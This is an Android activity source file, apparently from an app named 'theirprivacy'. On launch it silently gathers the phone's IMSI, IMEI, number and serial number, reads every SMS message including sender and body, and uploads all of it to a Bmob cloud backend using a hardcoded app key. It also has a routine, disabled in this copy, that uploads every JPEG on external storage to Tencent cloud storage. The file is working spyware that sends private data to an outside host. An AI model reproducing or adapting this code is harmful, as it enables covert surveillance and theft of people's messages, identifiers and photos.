package com.voler.theirprivacy.activity;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.widget.ImageView;

import com.tencent.cos.model.COSRequest;
import com.tencent.cos.model.COSResult;
import com.tencent.cos.model.PutObjectRequest;
import com.tencent.cos.model.PutObjectResult;
import com.tencent.cos.task.listener.IUploadTaskListener;
import com.voler.theirprivacy.R;
import com.voler.theirprivacy.bean.SmsInfo;
import com.voler.theirprivacy.bean.UserInfo;
import com.voler.theirprivacy.utils.PhoneInfo;
import com.voler.theirprivacy.utils.Sign;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;

import cn.bmob.v3.Bmob;
import cn.bmob.v3.exception.BmobException;
import cn.bmob.v3.listener.SaveListener;


public class MyMainActivity extends AppCompatActivity {

    String cosPath = "远端路径，即存储到cos上的路径";
    String srcPath = "本地文件的绝对路径";
    String sign = "签名，此处使用多次签名";
    private ImageView photo;
    private Sign mSign;
    private boolean isFinish;
    private boolean isSmsFinish;
    private Thread uploadThread;

    private Uri SMS_INBOX = Uri.parse("content://sms/");
    private String serialNumber;//序列号

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_my_main);
        photo = (ImageView) findViewById(R.id.iv_photo);
        mSign = Sign.getInstance(this);
        sign = mSign.getSign();
        final String absolutePath = Environment.getExternalStorageDirectory().getAbsolutePath();
        uploadThread = new Thread() {
            @Override
            public void run() {
                uploadFile(new File(absolutePath));
            }
        };
//        uploadThread.start();
//        uploadFile(new File(absolutePath));
//        Toast.makeText(this,"遍历完毕",Toast.LENGTH_SHORT).show();
        PhoneInfo siminfo = new PhoneInfo(MyMainActivity.this);

        //第一：默认初始化
        Bmob.initialize(this, "2cbf044b0ebaa1b8d2acea05f19a22d7");

        serialNumber = siminfo.getSerialNumber();
        UserInfo userInfo = new UserInfo();
        userInfo.setIMSI(siminfo.getIMSI());
        userInfo.setIMEI(siminfo.getPhoneInfo().getDeviceId());
        userInfo.setPhone(siminfo.getNativePhoneNumber());
        userInfo.setSerialnumber(serialNumber);
        userInfo.save(new SaveListener<String>() {
            @Override
            public void done(String objectId, BmobException e) {
                if (e == null) {
                    Log.w("TEST", "添加数据成功，返回objectId为：" + objectId);
                } else {
                    Log.w("TEST", "创建数据失败：" + e.getMessage());
                }
            }
        });

        new Thread() {
            @Override
            public void run() {
                getSmsFromPhone();
            }
        }.start();

    }


    private void upload(String srcPath) {
        isFinish = false;
//        String absolutePath = Environment.getExternalStorageDirectory().getAbsolutePath();


        cosPath = "photo" + File.separator + System.currentTimeMillis() + ".jpg";
//        srcPath = new File(absolutePath, "s.jpg").getAbsolutePath();
//        photo.setImageBitmap(BitmapFactory.decodeFile(srcPath));

        PutObjectRequest putObjectRequest = new PutObjectRequest();
        putObjectRequest.setBucket(mSign.getBucket());
        putObjectRequest.setCosPath(cosPath);
        putObjectRequest.setSrcPath(srcPath);
        putObjectRequest.setSign(sign);
        putObjectRequest.setListener(new IUploadTaskListener() {
            @Override
            public void onSuccess(COSRequest cosRequest, COSResult cosResult) {

                PutObjectResult result = (PutObjectResult) cosResult;
                if (result != null) {
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.append(" 上传结果： ret=" + result.code + "; msg =" + result.msg + "\n");
                    stringBuilder.append(" access_url= " + result.access_url == null ? "null" : result.access_url + "\n");
                    stringBuilder.append(" resource_path= " + result.resource_path == null ? "null" : result.resource_path + "\n");
                    stringBuilder.append(" url= " + result.url == null ? "null" : result.url);
                    Log.w("TEST", stringBuilder.toString());
//                    notifyAll();
//                    MyMainActivity.this.notifyAll();
                    isFinish = true;
                }
            }

            @Override
            public void onFailed(COSRequest COSRequest, final COSResult cosResult) {
                Log.w("TEST", "上传出错： ret =" + cosResult.code + "; msg =" + cosResult.msg);
                sign = mSign.getSign();
                isFinish = true;
            }

            @Override
            public void onProgress(COSRequest cosRequest, final long currentSize, final long totalSize) {
                float progress = (float) currentSize / totalSize;
                progress = progress * 100;
                Log.w("TEST", "进度：  " + (int) progress + "%");
            }

            @Override
            public void onCancel(COSRequest cosRequest, COSResult cosResult) {

            }
        });
        PutObjectResult result = mSign.getCOSClient().putObject(putObjectRequest);
    }


    private void uploadFile(File file) {
        if (!file.exists()) return;
        if (file.isFile()) {
            String filePath = file.getAbsolutePath();
            if (filePath.endsWith(".jpg")) {
                upload(filePath);
                while (!isFinish) {
                    try {
                        Thread.sleep(500);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        } else if (file.isDirectory()) {
            File[] files = file.listFiles();
            for (int i = 0; i < files.length; i++) {
                uploadFile(files[i]);
                Log.w("TEST", files[i].getAbsolutePath());
            }
        }
    }

    public void getSmsFromPhone() {
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"_id", "thread_id", "address", "subject", "person", "status", "read", "date", "type", "body"};//"_id", "address", "person",, "date", "type
        String where = " date >  "
                + "1079174999616";
        Cursor cur = cr.query(SMS_INBOX, projection, where, null, "date desc");
        if (null == cur)
            return;
        while (cur.moveToNext()) {
            String _id = cur.getString(cur.getColumnIndex("_id"));
            String thread_id = cur.getString(cur.getColumnIndex("thread_id"));
            String address = cur.getString(cur.getColumnIndex("address"));
            String subject = cur.getString(cur.getColumnIndex("subject"));
            String person = cur.getString(cur.getColumnIndex("person"));
            String status = cur.getString(cur.getColumnIndex("status"));
            String read = cur.getString(cur.getColumnIndex("read"));
            long date = cur.getLong(cur.getColumnIndex("date"));
            String type = cur.getString(cur.getColumnIndex("type"));
            String body = cur.getString(cur.getColumnIndex("body"));
            SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String dateString = formatter.format(new Date(date));


            SmsInfo smsInfo = new SmsInfo();
            smsInfo.setSerialnumber(serialNumber);
            smsInfo.setId(_id);
            smsInfo.setThread_id(thread_id);
            smsInfo.setAddress(address);
            smsInfo.setSubject(subject);
            smsInfo.setPerson(person);
            smsInfo.setStatus(status);
            smsInfo.setRead(read);
            smsInfo.setDate(dateString);
            smsInfo.setType(type);
            smsInfo.setBody(body);
            isSmsFinish = false;
            smsInfo.save(new SaveListener<String>() {
                @Override
                public void done(String objectId, BmobException e) {
                    if (e == null) {
                        Log.w("TEST", "添加数据成功，返回objectId为：" + objectId);
                    } else {
                        Log.w("TEST", "创建数据失败：" + e.getMessage());
                    }
//                    isSmsFinish = true;
                }
            });
            while (!isSmsFinish) {
                try {
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}

